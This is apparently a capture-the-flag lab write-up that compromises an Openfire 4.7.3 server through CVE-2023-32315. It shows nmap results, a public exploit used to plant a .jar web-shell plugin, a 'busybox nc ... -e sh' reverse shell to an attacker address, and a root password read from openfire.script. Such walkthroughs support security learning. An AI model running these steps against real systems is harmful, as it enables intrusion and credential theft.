
# Information Gathering 
Nmap Scan Results:

PORT     STATE SERVICE                VERSION  
22/tcp   open  ssh                    OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   3072 51:56:a7:34:16:8e:3d:47:17:c8:96:d5:e6:94:46:46 (RSA)  
|   256 fe:76:e3:4c:2b:f6:f5:21:a2:4d:9f:59:52:39:b9:16 (ECDSA)  
|_  256 2c:dd:62:7d:d6:1c:f4:fd:a1:e4:c8:aa:11:ae:d6:1f (ED25519)  
9090/tcp open  hadoop-tasktracker     Apache Hadoop  
|_http-title: Site doesn't have a title (text/html).  
| hadoop-tasktracker-info:    
|_  Logs: jive-ibtn jive-btn-gradient  
|_http-favicon: Unknown favicon MD5: E4888EE8491B4EB75501996E41AF6460  
| hadoop-datanode-info:    
|_  Logs: jive-ibtn jive-btn-gradient  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS  
9091/tcp open  ssl/hadoop-tasktracker Apache Hadoop  
| hadoop-datanode-info:    
|_  Logs: jive-ibtn jive-btn-gradient  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS  
|_http-favicon: Unknown favicon MD5: E4888EE8491B4EB75501996E41AF6460  
|_http-title: Site doesn't have a title (text/html).  
| ssl-cert: Subject: commonName=localhost  
| Subject Alternative Name: DNS:localhost, DNS:*.localhost  
| Issuer: commonName=localhost  
| Public Key type: rsa  
| Public Key bits: 2048  
| Signature Algorithm: sha256WithRSAEncryption  
| Not valid before: 2024-06-28T07:02:39  
| Not valid after:  2029-06-27T07:02:39  
| MD5:     41ee f1c1 0cef c4b0 2436 f5e7 75f4 b064  
| SHA-1:   c90c b82e 0547 56be 1f7b adb4 4a3a 5de7 c177 a4d3  
|_SHA-256: e282 23c6 8fe9 87f6 ad6e 1e4b 7232 b2f7 cf39 66f4 8be1 f46e 5a73 8b85 7ec7 5d52  
| hadoop-tasktracker-info:    
|_  Logs: jive-ibtn jive-btn-gradient  
|_ssl-date: TLS randomness does not represent time  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

==🟡Available Ports: 22, 9090, 9091==

Gobuster results:
Error received, connection timed out.

Port 9090 open to a "Openfire Admin Console." The currently running version of Openfire is v4.7.3. After researching, this version is linked directly to CVE-2023-32315 and is vulnerable to remote code execution (RCE).





# Service Enumeration

CVE-2023-32315 states that version 3.10.0 - 4.7.4 are vulnerable to a path traversal attach in the setups environment which allows users to perform remote code execution. 

Since this is a known CVE, we can us this exploit written by *miko550* to gain a foothold on the target machine -> https://github.com/miko550/CVE-2023-32315

Following the exploit steps we create a credible user account to login to the Openfire admin console, manually upload a .jar plugin to change the system command password, and run system commands via the web shell under the "server settings" management tool page.

After multiple attempts at receiving a reverse shell, the command that worked best for connection was the busybox command:

	busybox nc 192.168.XXX.XXX 80 -e sh

Successfully, we now have a direct foothold as the "openfire" user.


# Privilege Escalation

With our foothold on the target machine, we now check known privilege escalation areas to gain root privileges.

Under the */var/lib/openfire* directory, there is a file name, "openfire.script." When outputting this file we can find logging information that details failed and successful login attempts for the *root* user account.

For example: 

	INSERT INTO OFPROPERTY VALUES('mail.smtp.password','OpenFireAtEveryone',0,NULL)


Using this login information we directly attempt switching into the root user account.

	su root
	OpenFireAtEveryone

Success, we have gained access to the root user! The proof.txt flag can be found in the root home directory. The machine is now solved.